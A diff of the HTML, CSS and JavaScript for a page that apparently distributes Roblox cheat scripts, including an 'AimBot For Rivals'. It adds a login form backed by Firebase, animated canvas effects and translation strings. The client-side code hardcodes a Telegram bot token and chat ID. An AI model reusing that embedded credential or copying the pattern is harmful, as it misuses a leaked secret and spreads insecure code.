+.mad-btn:hover{background:#ff3b3b;color:#0a0a0a;transform:scale(1.05)}
+.mad-btn:active{transform:scale(.98);transition-duration:.15s}
+
+/* ============ ЯЗЫКОВОЙ ПЕРЕКЛЮЧАТЕЛЬ ============ */
+.lang-switcher{display:none;position:fixed;top:1.25rem;left:1.25rem;z-index:150}
+.lang-switcher.visible{display:block}
+.lang-switcher select{
+  background:rgba(10,20,36,.85);
+  backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
+  color:#c9d9f0;border:1px solid var(--blue-3);border-radius:999px;
+  padding:.5rem 1.1rem;font-size:.85rem;font-family:inherit;cursor:pointer;
+  transition:background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);
+  appearance:none;-webkit-appearance:none;padding-right:1.9rem;
+  background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%235b7fb5' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+  background-repeat:no-repeat;background-position:right .7rem center;background-size:14px;
+  transform:translateZ(0);
+}
+.lang-switcher select:hover{background-color:#132a4a;border-color:var(--blue-1);color:#fff;box-shadow:0 0 10px rgba(58,123,213,.15)}
+.lang-switcher select:focus{outline:none;border-color:var(--blue-1)}
+
+/* ============ 3D ЧЁРНАЯ ДЫРА ============ */
+.holo-zone{
+  position:fixed;top:1.5rem;right:1.5rem;
+  width:200px;height:200px;z-index:50;
+  perspective:800px;
+  border:1px dashed rgba(90,160,255,.35);
+  border-radius:20px;
+  background:radial-gradient(circle at center,rgba(20,50,120,.18),transparent 70%);
+  transition:border-color .7s var(--smooth),background .7s var(--smooth),opacity .7s var(--smooth),box-shadow .7s var(--smooth);
+  opacity:0;pointer-events:none;visibility:hidden;
+  transform:translateZ(0);
+  overflow:hidden;
+}
+.holo-zone.active{opacity:1;pointer-events:auto;visibility:visible}
+.holo-zone.active:hover{
+  border-color:rgba(90,160,255,.9);
+  background:radial-gradient(circle at center,rgba(30,80,180,.28),transparent 70%);
+  box-shadow:0 0 30px rgba(90,160,255,.2),inset 0 0 20px rgba(90,160,255,.08);
+}
+.holo-zone canvas{
+  position:absolute;inset:0;
+  width:100%;height:100%;
+  display:block;pointer-events:none;
+}
+.holo-zone .zone-label{
+  position:absolute;bottom:-24px;left:50%;
+  transform:translateX(-50%);
+  font-size:.7rem;color:#4a6890;letter-spacing:.2em;text-transform:uppercase;
+  white-space:nowrap;pointer-events:none;
+  transition:color .7s var(--smooth);
+}
+.holo-zone:hover .zone-label{color:#7aa8e0}
+
+/* ============ АВТОРИЗАЦИЯ ============ */
+.auth-title{font-size:1.5rem;font-weight:400;color:#fff;margin-bottom:.5rem;letter-spacing:.03em}
+.auth-sub{font-size:.85rem;color:var(--muted);margin-bottom:2rem}
+.auth-input{
+  width:100%;padding:.85rem 1.1rem;
+  background:#0a1424;border:1px solid var(--blue-3);border-radius:12px;
+  color:#dce7f5;font-family:inherit;font-size:.95rem;
+  transition:border-color .5s var(--smooth),box-shadow .5s var(--smooth);
+  margin-bottom:1rem;outline:none;
+}
+.auth-input:focus{border-color:var(--blue-1);box-shadow:0 0 12px rgba(58,123,213,.15)}
+.auth-input::placeholder{color:#3e5a80}
+.auth-btn{
+  display:block;width:100%;padding:.85rem 2rem;
+  border:1px solid var(--blue-1);border-radius:999px;
+  background:linear-gradient(180deg,rgba(58,123,213,.2),rgba(30,60,110,.25));
+  color:#7ab0ff;font-size:.95rem;letter-spacing:.05em;
+  cursor:pointer;font-family:inherit;margin-bottom:.75rem;
+  transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);
+  transform:translateZ(0);
+}
+.auth-btn:hover{
+  background:linear-gradient(180deg,var(--blue-1),#2a5aa0);
+  color:#fff;transform:scale(1.02);
+  box-shadow:0 0 15px rgba(58,123,213,.3);
+}
+.auth-btn:active{transform:scale(.98);transition-duration:.15s}
+.auth-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
+.auth-switch{font-size:.85rem;color:var(--muted);margin-top:1rem}
+.auth-switch a{color:#7ab0ff;text-decoration:none;cursor:pointer;transition:color .5s var(--smooth)}
+.auth-switch a:hover{color:#a8d4ff}
+.auth-close{
+  display:inline-block;margin-top:1rem;font-size:.85rem;color:#4a6890;
+  cursor:pointer;transition:color .5s var(--smooth);
+  background:none;border:none;font-family:inherit;
+}
+.auth-close:hover{color:#7aa8e0}
+
+/* ============ ПРОФИЛЬ ============ */
+.profile-card{
+  display:none;flex-direction:column;align-items:center;gap:.75rem;
+  background:linear-gradient(180deg,rgba(15,28,50,.9),rgba(10,20,36,.98));
+  border:1px solid var(--blue-1);border-radius:20px;
+  padding:1.5rem 1.75rem;width:100%;max-width:280px;
+  box-shadow:0 0 25px rgba(58,123,213,.15),inset 0 0 30px rgba(58,123,213,.05);
+  animation:profileIn .8s var(--smooth) forwards;
+  position:relative;overflow:hidden;will-change:transform,opacity;
+}
+.profile-card::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--blue-2),transparent);
+}
+@keyframes profileIn{
+  from{opacity:0;transform:translateY(12px) scale(.96)}
+  to{opacity:1;transform:translateY(0) scale(1)}
+}
+.profile-card.show{display:flex}
+.profile-avatar{
+  width:56px;height:56px;border-radius:50%;
+  background:linear-gradient(135deg,var(--blue-1),var(--blue-3));
+  display:flex;align-items:center;justify-content:center;
+  color:#fff;font-size:1.5rem;font-weight:500;text-transform:uppercase;
+  box-shadow:0 0 15px rgba(58,123,213,.35),0 0 10px rgba(120,180,255,.3) inset;
+  border:1px solid var(--blue-2);position:relative;
+}
+.profile-avatar::after{
+  content:'';position:absolute;inset:-4px;border-radius:50%;
+  border:1px solid rgba(94,160,255,.5);
+  animation:avatarRing 5s linear infinite;
+  will-change:transform,opacity;
+}
+@keyframes avatarRing{
+  from{transform:rotate(0) scale(1);opacity:.7}
+  to{transform:rotate(360deg) scale(1.08);opacity:0}
+}
+.profile-name{font-size:.95rem;color:#fff;word-break:break-all;text-align:center;font-weight:400}
+.profile-status{
+  font-size:.75rem;color:var(--blue-2);
+  letter-spacing:.1em;text-transform:uppercase;
+  display:flex;align-items:center;gap:.4rem;
+}
+.profile-status::before{
+  content:'';width:7px;height:7px;border-radius:50%;
+  background:var(--blue-2);
+  box-shadow:0 0 10px var(--blue-2),0 0 5px var(--blue-2);
+  animation:statusPulse 3.5s ease-in-out infinite;
+  will-change:opacity;
+}
+@keyframes statusPulse{0%,100%{opacity:1}50%{opacity:.55}}
+.profile-divider{width:100%;height:1px;background:linear-gradient(90deg,transparent,var(--blue-3),transparent);margin:.25rem 0}
+.profile-actions{display:flex;flex-direction:column;gap:.5rem;width:100%}
+.profile-btn{
+  display:flex;align-items:center;justify-content:center;gap:.5rem;
+  padding:.6rem 1rem;
+  border:1px solid var(--blue-3);border-radius:999px;
+  background:transparent;color:#b8cce6;
+  font-family:inherit;font-size:.85rem;cursor:pointer;text-decoration:none;
+  transition:background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);
+}
+.profile-btn:hover{background:#132a4a;border-color:var(--blue-1);color:#fff;box-shadow:0 0 10px rgba(58,123,213,.15)}
+.profile-btn.danger:hover{background:rgba(198,40,40,.2);border-color:#c62828;color:#ef9a9a}
+.profile-btn svg{width:14px;height:14px;flex-shrink:0}
+
+/* ============ АДАПТИВ ============ */
+@media (max-width:700px){
+  .lang-switcher{top:.75rem;left:.75rem}
+  .lang-switcher select{padding:.4rem .9rem;font-size:.75rem;padding-right:1.7rem;background-size:12px}
+  h1{font-size:2.5rem}
+  h2{font-size:1rem}
+  .scripts-title{font-size:1.4rem;margin-bottom:1rem}
+  .copy-text{font-size:.7rem;padding:.6rem .9rem}
+  .script-label{font-size:1rem}
+  .script-block{margin-bottom:1.2rem;padding:.5rem 0}
+  footer{font-size:.7rem;margin-top:1rem}
+  footer .disclaimer{font-size:.6rem}
+  .warning-icon{font-size:3.5rem}
+  .warning-title{font-size:1.2rem}
+  .warning-text{font-size:.85rem}
+  .warning-box{padding:2rem 1.5rem}
+  .warning-btn{font-size:.85rem;padding:.75rem 1.5rem}
+  .review-form{padding:1.5rem 1.2rem}
+  .stars-input label{font-size:1.9rem}
+  .stars-input{margin-bottom:1rem}
+  .reviews-title{font-size:1.4rem}
+  .thanks-icon,.mad-icon{font-size:3.5rem}
+  .thanks-title,.mad-title{font-size:1.2rem}
+  .thanks-text,.mad-text{font-size:.85rem}
+  .thanks-box,.mad-box{padding:2rem 1.5rem}
+  .holo-zone{top:4rem;right:-1rem;width:130px;height:130px;transform:scale(.8);transform-origin:top right}
+  .holo-zone .zone-label{font-size:.55rem}
+  .profile-card{max-width:260px;padding:1.25rem 1.5rem}
+  .profile-avatar{width:48px;height:48px;font-size:1.25rem}
+  .back-link{top:.75rem;right:.75rem;padding:.5rem 1rem;font-size:.75rem}
+  .review-textarea{min-height:80px}
+}
+@media (prefers-reduced-motion:reduce){
+  *{animation-duration:.01ms !important;transition-duration:.01ms !important}
+  .page-content{transition:none}
+}
 </style>
+<script>
+  try{
+    var __l = localStorage.getItem('seal_lang') || (navigator.language || 'en').slice(0,2);
+    if(__l === 'pt-BR' || __l === 'pt-br') __l = 'pt';
+    document.documentElement.lang = __l;
+  }catch(e){}
+</script>
 </head>
 <body>
+
+<canvas id="bg-canvas"></canvas>
+<div class="bg-vignette"></div>
+<div class="bg-scan"></div>
+
+<button class="back-link" id="globalBack">Go Back</button>
+
+<!-- 3D ЧЁРНАЯ ДЫРА -->
+<div class="holo-zone" id="holoZone">
+  <canvas id="blackHoleCanvas"></canvas>
+  <div class="zone-label">event horizon</div>
+</div>
+
 <div class="lang-switcher" id="langSwitcher">
 <select id="langSelect">
 <option value="en">English</option>
@@ -132,6 +660,7 @@ footer .disclaimer{font-size:.65rem}
 <option value="de">Deutsch</option>
 </select>
 </div>
+
 <section class="page active" id="page-home">
 <div class="page-content" data-tilt>
 <h1 data-i18n="welcome">Welcome</h1>
@@ -140,6 +669,24 @@ footer .disclaimer{font-size:.65rem}
 <div class="home-buttons">
 <button class="btn" id="goToScripts" data-i18n="viewScripts">View scripts</button>
 <button class="btn" id="goToReviews" data-i18n="reviews">Reviews</button>
+<button class="btn" id="openAuth" data-i18n="login">Login / Register</button>
+
+<div class="profile-card" id="profileCard">
+  <div class="profile-avatar" id="profileAvatar">S</div>
+  <div class="profile-name" id="profileName">user@email.com</div>
+  <div class="profile-status">online</div>
+  <div class="profile-divider"></div>
+  <div class="profile-actions">
+    <a class="profile-btn" href="#reviews" id="profileReviews">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
+      My reviews
+    </a>
+    <button class="profile-btn danger" id="signOutBtn">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
+      Logout
+    </button>
+  </div>
+</div>
 </div>
 <footer>
 <span class="copyright">© 2026 SealScripts</span>
@@ -147,6 +694,7 @@ footer .disclaimer{font-size:.65rem}
 </footer>
 </div>
 </section>
+
 <section class="page" id="page-scripts">
 <div class="page-content" data-tilt>
 <h3 class="scripts-title">seal's scripts</h3>
@@ -177,9 +725,9 @@ footer .disclaimer{font-size:.65rem}
 </div>
 <p class="script-label">AimBot For Rivals</p>
 </div>
-<button class="back-link" id="goToHomeFromScripts" data-i18n="goBack">Go Back</button>
 </div>
 </section>
+
 <section class="page" id="page-reviews">
 <div class="page-content" data-tilt>
 <h3 class="reviews-title" data-i18n="leaveReview">Leave a review</h3>
@@ -202,9 +750,24 @@ footer .disclaimer{font-size:.65rem}
 <textarea class="review-textarea" id="reviewText" data-i18n-placeholder="reviewPlaceholder" placeholder="Write your honest review here... (optional)" maxlength="500"></textarea>
 <button type="button" class="submit-btn" id="submitBtn" data-i18n="sendToSeal">Send To Seal</button>
 </div>
-<button class="back-link" id="goToHomeFromReviews" data-i18n="goBack">Go Back</button>
 </div>
 </section>
+
+<div class="auth-overlay" id="authOverlay">
+<div class="auth-box">
+<h3 class="auth-title" id="authTitle">Login</h3>
+<p class="auth-sub" id="authSub">Enter your email and password</p>
+<input class="auth-input" type="email" id="authEmail" placeholder="Email" autocomplete="email">
+<input class="auth-input" type="password" id="authPassword" placeholder="Password" autocomplete="current-password">
+<button class="auth-btn" id="authSubmit">Login</button>
+<div class="auth-switch">
+<span id="authSwitchText">Don't have an account?</span>
+<a id="authSwitchLink">Register</a>
+</div>
+<button class="auth-close" id="authClose">Close</button>
+</div>
+</div>
+
 <div class="warning-overlay" id="warningOverlay">
 <div class="warning-box">
 <div class="warning-icon">⚠</div>
@@ -213,6 +776,7 @@ footer .disclaimer{font-size:.65rem}
 <button class="warning-btn" id="warningConfirm" data-i18n="warningBtn">I take responsibility, copy</button>
 </div>
 </div>
+
 <div class="thanks-overlay" id="thanksOverlay">
 <div class="thanks-box">
 <div class="thanks-icon">✓</div>
@@ -221,6 +785,7 @@ footer .disclaimer{font-size:.65rem}
 <button class="thanks-btn" id="thanksClose" data-i18n="close">Close</button>
 </div>
 </div>
+
 <div class="mad-overlay" id="madOverlay">
 <div class="mad-box">
 <div class="mad-icon">✗</div>
@@ -229,22 +794,383 @@ footer .disclaimer{font-size:.65rem}
 <button class="mad-btn" id="madClose" data-i18n="close">Close</button>
 </div>
 </div>
+
 <div class="toast" id="toast">Copied ✓</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import {
+  getAuth,
+  setPersistence,
+  browserLocalPersistence,
+  createUserWithEmailAndPassword,
+  signInWithEmailAndPassword,
+  signOut,
+  onAuthStateChanged
+} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCrtgO3Gh34EhckQLIKH-BZEVdsvsM0rJI",
+  authDomain: "seal-scripts-46391.firebaseapp.com",
+  projectId: "seal-scripts-46391",
+  storageBucket: "seal-scripts-46391.firebasestorage.app",
+  messagingSenderId: "750846528422",
+  appId: "1:750846528422:web:860cf4a4f68acdc70a1d67"
+};
+
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+
+await setPersistence(auth, browserLocalPersistence).catch(err => {
+  console.error('Persistence error:', err);
+});
+
+window.firebaseAuth = {
+  createUserWithEmailAndPassword,
+  signInWithEmailAndPassword,
+  signOut,
+  onAuthStateChanged,
+  auth
+};
+
+window.dispatchEvent(new Event('firebase-ready'));
+</script>
+
 <script>
 const TELEGRAM_PROXY = 'https://summer-hall-5536.autismallahakbar.workers.dev';
 const BOT_TOKEN = '8956553138:AAGIivvQO_8XJe3FnKG_OCfaqJm7knTHyN4';
 const CHAT_ID = '7937831655';
 
+/* ================= ФОНОВЫЕ ЧАСТИЦЫ ================= */
+(function(){
+  const canvas = document.getElementById('bg-canvas');
+  const ctx = canvas.getContext('2d');
+  let W, H, particles = [];
+  const COUNT = 65;
+  let lastT = performance.now();
+  let elapsed = 0;
+  const dpr = Math.min(window.devicePixelRatio || 1, 2);
+
+  function makeParticle(){
+    return {
+      x: Math.random() * W,
+      y: Math.random() * H,
+      vx: (Math.random() - .5) * .04,
+      vy: (Math.random() - .5) * .04,
+      phaseX: Math.random() * Math.PI * 2,
+      phaseY: Math.random() * Math.PI * 2,
+      ampX: Math.random() * .5 + .15,
+      ampY: Math.random() * .5 + .15,
+      freq: Math.random() * .5 + .15,
+      r: Math.random() * 1.7 + .4,
+      a: Math.random() * .55 + .2
+    };
+  }
+
+  function resize(){
+    W = window.innerWidth;
+    H = window.innerHeight;
+    canvas.width = W * dpr;
+    canvas.height = H * dpr;
+    canvas.style.width = W + 'px';
+    canvas.style.height = H + 'px';
+    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+  }
+  resize();
+  window.addEventListener('resize', () => {
+    resize();
+    particles = [];
+    for(let i = 0; i < COUNT; i++) particles.push(makeParticle());
+  });
+
+  for(let i = 0; i < COUNT; i++) particles.push(makeParticle());
+
+  function draw(now){
+    const dt = Math.min((now - lastT) / 16.67, 3);
+    lastT = now;
+    elapsed += dt / 60;
+    ctx.clearRect(0, 0, W, H);
+
+    for(let i = 0; i < particles.length; i++){
+      const p = particles[i];
+      p.x += p.vx * dt;
+      p.y += p.vy * dt;
+
+      const ox = Math.sin(elapsed * p.freq * Math.PI * 2 + p.phaseX) * p.ampX;
+      const oy = Math.cos(elapsed * p.freq * Math.PI * 2 + p.phaseY) * p.ampY;
+
+      if(p.x < -20) p.x = W + 20;
+      if(p.x > W + 20) p.x = -20;
+      if(p.y < -20) p.y = H + 20;
+      if(p.y > H + 20) p.y = -20;
+
+      const px = p.x + ox;
+      const py = p.y + oy;
+
+      ctx.beginPath();
+      ctx.arc(px, py, p.r, 0, Math.PI * 2);
+      ctx.fillStyle = `rgba(120,180,255,${p.a})`;
+      ctx.fill();
+
+      for(let j = i + 1; j < particles.length; j++){
+        const q = particles[j];
+        const qx = q.x + Math.sin(elapsed * q.freq * Math.PI * 2 + q.phaseX) * q.ampX;
+        const qy = q.y + Math.cos(elapsed * q.freq * Math.PI * 2 + q.phaseY) * q.ampY;
+        const dx = px - qx, dy = py - qy;
+        const d = Math.sqrt(dx * dx + dy * dy);
+        if(d < 130){
+          ctx.beginPath();
+          ctx.moveTo(px, py);
+          ctx.lineTo(qx, qy);
+          ctx.strokeStyle = `rgba(90,160,255,${(1 - d / 130) * .1})`;
+          ctx.lineWidth = .5;
+          ctx.stroke();
+        }
+      }
+    }
+    requestAnimationFrame(draw);
+  }
+  requestAnimationFrame(draw);
+})();
+
+/* ================= RIPPLE ================= */
+document.querySelectorAll('.btn, .submit-btn, .auth-btn, .warning-btn, .thanks-btn, .mad-btn, .back-link').forEach(btn => {
+  btn.addEventListener('click', function(e){
+    const rect = this.getBoundingClientRect();
+    const ripple = document.createElement('span');
+    ripple.className = 'ripple';
+    const size = Math.max(rect.width, rect.height);
+    ripple.style.width = ripple.style.height = size + 'px';
+    ripple.style.left = (e.clientX - rect.left - size / 2) + 'px';
+    ripple.style.top = (e.clientY - rect.top - size / 2) + 'px';
+    this.appendChild(ripple);
+    setTimeout(() => ripple.remove(), 900);
+  });
+});
+
+/* ================= 3D ЧЁРНАЯ ДЫРА ================= */
+(function(){
+  const zone = document.getElementById('holoZone');
+  const canvas = document.getElementById('blackHoleCanvas');
+  if(!zone || !canvas) return;
+  const ctx = canvas.getContext('2d');
+  const DPR = Math.min(window.devicePixelRatio || 1, 2);
+
+  let W = 200, H = 200, CX = 100, CY = 100;
+  let baseScale = 1;
+
+  function resize(){
+    const rect = zone.getBoundingClientRect();
+    W = rect.width || 200;
+    H = rect.height || 200;
+    canvas.width = W * DPR;
+    canvas.height = H * DPR;
+    canvas.style.width = W + 'px';
+    canvas.style.height = H + 'px';
+    ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
+    CX = W / 2;
+    CY = H / 2;
+    baseScale = Math.min(W, H) / 200;
+  }
+  resize();
+  window.addEventListener('resize', resize);
+
+  function rotX(v, a){const c=Math.cos(a),s=Math.sin(a);return{x:v.x,y:v.y*c-v.z*s,z:v.y*s+v.z*c}}
+  function rotY(v, a){const c=Math.cos(a),s=Math.sin(a);return{x:v.x*c+v.z*s,y:v.y,z:-v.x*s+v.z*c}}
+  function rotZ(v, a){const c=Math.cos(a),s=Math.sin(a);return{x:v.x*c-v.y*s,y:v.x*s+v.y*c,z:v.z}}
+  function project(v, camZ){
+    const d = camZ - v.z;
+    const k = 300 / Math.max(d, 0.1);
+    return { x: v.x * k, y: v.y * k, scale: k, depth: v.z };
+  }
+
+  const particles = [];
+  const PARTICLE_COUNT = 220;
+  function spawnParticle(){
+    return {
+      angle: Math.random() * Math.PI * 2,
+      radius: 30 + Math.random() * 90,
+      y: (Math.random() - 0.5) * 4,
+      speed: 0.008 + Math.random() * 0.018,
+      fall: 0.12 + Math.random() * 0.3,
+      size: 0.6 + Math.random() * 1.4,
+      bright: 0.5 + Math.random() * 0.5
+    };
+  }
+  for(let i = 0; i < PARTICLE_COUNT; i++) particles.push(spawnParticle());
+
+  const diskRings = [
+    { r: 30, hue: 195, a: 0.95, thick: 1.4, segs: 60 },
+    { r: 42, hue: 200, a: 0.8,  thick: 1.6, segs: 72 },
+    { r: 56, hue: 205, a: 0.6,  thick: 1.8, segs: 84 },
+    { r: 72, hue: 210, a: 0.4,  thick: 2.0, segs: 96 },
+    { r: 90, hue: 215, a: 0.25, thick: 2.2, segs: 108 }
+  ];
+
+  let tmx = 0, tmy = 0, mx = 0, my = 0;
+  let pulse = 0;
+  let autoRotY = 0;
+  let lastT = performance.now();
+
+  zone.addEventListener('mousemove', e => {
+    const rect = zone.getBoundingClientRect();
+    tmx = ((e.clientX - rect.left) / rect.width - 0.5) * 2;
+    tmy = ((e.clientY - rect.top) / rect.height - 0.5) * 2;
+  });
+  zone.addEventListener('mouseleave', () => { tmx = 0; tmy = 0; });
+  zone.addEventListener('click', () => { pulse = 1; });
+
+  function draw(now){
+    const dt = Math.min((now - lastT) / 1000, 0.05);
+    lastT = now;
+
+    mx += (tmx - mx) * 0.08;
+    my += (tmy - my) * 0.08;
+    pulse *= 0.94;
+    autoRotY += 0.35 * dt;
+
+    ctx.clearRect(0, 0, W, H);
+
+    const camZ = 170;
+    const cx = CX + mx * 4 * baseScale;
+    const cy = CY + my * 4 * baseScale;
+
+    const angleX = -0.55 + my * 0.55;
+    const angleY = autoRotY + mx * 0.9;
+    const angleZ = mx * 0.15;
+
+    const halo = ctx.createRadialGradient(cx, cy, 0, cx, cy, 95 * baseScale);
+    halo.addColorStop(0, 'rgba(120,180,255,0.18)');
+    halo.addColorStop(0.5, 'rgba(58,123,213,0.06)');
+    halo.addColorStop(1, 'rgba(58,123,213,0)');
+    ctx.fillStyle = halo;
+    ctx.beginPath();
+    ctx.arc(cx, cy, 95 * baseScale, 0, Math.PI * 2);
+    ctx.fill();
+
+    const items = [];
+
+    for(const ring of diskRings){
+      for(let i = 0; i < ring.segs; i++){
+        const a = (i / ring.segs) * Math.PI * 2 + now * 0.0006 * ring.r * 0.05;
+        const v = { x: Math.cos(a) * ring.r, y: 0, z: Math.sin(a) * ring.r };
+        items.push({ type: 'disk', v, a, ring });
+      }
+    }
+
+    for(let i = 0; i < 80; i++){
+      const a = (i / 80) * Math.PI * 2;
+      const v = { x: Math.cos(a) * 20, y: Math.sin(a) * 20, z: 0 };
+      items.push({ type: 'photon', v, a });
+    }
+
+    for(let i = 0; i < particles.length; i++){
+      const p = particles[i];
+      p.angle += p.speed * (1 + (90 - p.radius) / 60) * 60 * dt;
+      p.radius -= p.fall * 60 * dt * (0.5 + (1 - p.radius / 90));
+      if(p.radius < 22){
+        particles[i] = spawnParticle();
+        continue;
+      }
+      const v = {
+        x: Math.cos(p.angle) * p.radius,
+        y: p.y * (1 - p.radius / 120),
+        z: Math.sin(p.angle) * p.radius
+      };
+      items.push({ type: 'particle', v, p });
+    }
+
+    for(const it of items){
+      let p = { x: it.v.x, y: it.v.y, z: it.v.z };
+      p = rotX(p, angleX);
+      p = rotY(p, angleY);
+      p = rotZ(p, angleZ);
+      it.rot = p;
+    }
+    items.sort((A, B) => A.rot.z - B.rot.z);
+
+    for(const it of items){
+      const s = project(it.rot, camZ);
+      const sx = cx + s.x * baseScale;
+      const sy = cy + s.y * baseScale;
+
+      const dx = sx - cx, dy = sy - cy;
+      const distToCenter = Math.sqrt(dx * dx + dy * dy);
+      const ehScreen = 18 * baseScale * (300 / camZ);
+
+      if(it.rot.z < 0 && distToCenter < ehScreen){
+        continue;
+      }
+
+      if(it.type === 'photon'){
+        const alpha = 0.7 + Math.sin(now * 0.003 + it.a * 3) * 0.2;
+        const sz = Math.max(0.5, 1.1 * baseScale * s.scale / 300);
+        ctx.beginPath();
+        ctx.arc(sx, sy, sz, 0, Math.PI * 2);
+        ctx.fillStyle = `rgba(220,240,255,${alpha})`;
+        ctx.fill();
+      } else if(it.type === 'disk'){
+        const alpha = it.ring.a * (0.6 + 0.4 * Math.sin(now * 0.002 + it.a * 4));
+        const sz = Math.max(0.4, it.ring.thick * baseScale * s.scale / 300);
+        ctx.beginPath();
+        ctx.arc(sx, sy, sz, 0, Math.PI * 2);
+        ctx.fillStyle = `hsla(${it.ring.hue}, 100%, 78%, ${alpha})`;
+        ctx.fill();
+      } else if(it.type === 'particle'){
+        const dist = Math.sqrt(it.v.x * it.v.x + it.v.z * it.v.z);
+        const inner = Math.max(0, 1 - dist / 90);
+        const alpha = it.p.bright * (0.5 + inner * 0.5);
+        const hue = 195 + inner * 30;
+        const light = 70 + inner * 25;
+        const sz = Math.max(0.4, it.p.size * baseScale * s.scale / 300 * 0.9);
+        ctx.beginPath();
+        ctx.arc(sx, sy, sz, 0, Math.PI * 2);
+        ctx.fillStyle = `hsla(${hue}, 100%, ${light}%, ${alpha})`;
+        ctx.fill();
+      }
+    }
+
+    const sph = project({ x: 0, y: 0, z: 0 }, camZ);
+    const sphX = cx + sph.x * baseScale;
+    const sphY = cy + sph.y * baseScale;
+    const sphR = 18 * baseScale * (sph.scale / 300) * (1 + pulse * 0.15);
+
+    const photonGrad = ctx.createRadialGradient(sphX, sphY, sphR * 0.5, sphX, sphY, sphR + 7 * baseScale);
+    photonGrad.addColorStop(0, 'rgba(240,250,255,1)');
+    photonGrad.addColorStop(0.5, 'rgba(140,200,255,0.85)');
+    photonGrad.addColorStop(1, 'rgba(90,160,255,0)');
+    ctx.beginPath();
+    ctx.arc(sphX, sphY, sphR + 6 * baseScale, 0, Math.PI * 2);
+    ctx.fillStyle = photonGrad;
+    ctx.fill();
+
+    ctx.beginPath();
+    ctx.arc(sphX, sphY, sphR, 0, Math.PI * 2);
+    ctx.fillStyle = '#000';
+    ctx.fill();
+
+    ctx.beginPath();
+    ctx.arc(sphX, sphY, sphR, 0, Math.PI * 2);
+    ctx.strokeStyle = `rgba(180,220,255,${0.9 + pulse * 0.1})`;
+    ctx.lineWidth = 1;
+    ctx.stroke();
+
+    requestAnimationFrame(draw);
+  }
+  requestAnimationFrame(draw);
+})();
+
+/* ================= ПЕРЕВОДЫ ================= */
 const translations={
-en:{welcome:"Welcome",presents:"seal scripts presents",viewScripts:"View scripts",reviews:"Reviews",disclaimer:"This website is not affiliated with, endorsed by, or connected to Roblox Corporation, the game Roblox, or any in-game projects. All coincidences are purely accidental.",copy:"Copy",leaveReview:"Leave a review",reviewSubtitle:"Rate the scripts from 1 to 5 stars. Anonymous reviews.",yourRating:"Your rating",yourReview:"Your review",reviewPlaceholder:"Write your honest review here... (optional)",sendToSeal:"Send To Seal",goBack:"Go Back",warningTitle:"Warning",warningText:"By using these scripts, you take <strong>full responsibility</strong> for your account. If you get banned by moderators or admins — <strong>Seal is not involved</strong> in any way.<br><br>Play carefully and at your own risk.",warningBtn:"I take responsibility, copy",pleaseRead:"Please read...",thanksTitle:"Thanks For Review!",thanksText:"Your feedback means a lot to Seal.<br>It will be reviewed soon.",close:"Close",madTitle:"Seal is mad",madText:"You already left a review.<br>Each user can only submit one review.",pickRating:"Please pick a rating first",copied:"Copied ✓",couldNotCopy:"Could not copy",sending:"Sending...",sent:"Sent ✓"},
-es:{welcome:"Bienvenido",presents:"seal scripts presenta",viewScripts:"Ver scripts",reviews:"Reseñas",disclaimer:"Este sitio web no está afiliado, respaldado ni conectado con Roblox Corporation, el juego Roblox ni ningún proyecto dentro del juego. Todas las coincidencias son puramente accidentales.",copy:"Copiar",leaveReview:"Deja una reseña",reviewSubtitle:"Valora los scripts de 1 a 5 estrellas. Reseñas anónimas.",yourRating:"Tu valoración",yourReview:"Tu reseña",reviewPlaceholder:"Escribe tu reseña honesta aquí... (opcional)",sendToSeal:"Enviar a Seal",goBack:"Volver",warningTitle:"Advertencia",warningText:"Al usar estos scripts, asumes <strong>toda la responsabilidad</strong> de tu cuenta. Si los moderadores o administradores te banean — <strong>Seal no tiene nada que ver</strong>.<br><br>Juega con cuidado y bajo tu propio riesgo.",warningBtn:"Asumo la responsabilidad, copiar",pleaseRead:"Por favor lee...",thanksTitle:"¡Gracias por tu reseña!",thanksText:"Tu opinión significa mucho para Seal.<br>Será revisada pronto.",close:"Cerrar",madTitle:"Seal está enojado",madText:"Ya dejaste una reseña.<br>Cada usuario puede enviar solo una reseña.",pickRating:"Primero elige una valoración",copied:"Copiado ✓",couldNotCopy:"No se pudo copiar",sending:"Enviando...",sent:"Enviado ✓"},
